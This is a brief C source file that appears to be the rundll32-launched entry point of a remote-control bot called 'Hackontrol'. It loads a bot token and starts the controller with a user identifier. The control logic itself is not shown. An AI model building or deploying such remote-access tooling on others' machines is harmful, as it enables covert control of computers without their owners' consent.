#include <stdio.h>
#include <khopanwin32.h>
#include "token.h"
#include "hackontrol.h"

__declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
	LPSTR token = getBotToken();

	if(!token) {
		KHWin32DialogErrorW(GetLastError(), L"getBotToken");
		return;
	}

	startHackontrol(token, getUserIdentifier());
	LocalFree(token);
}
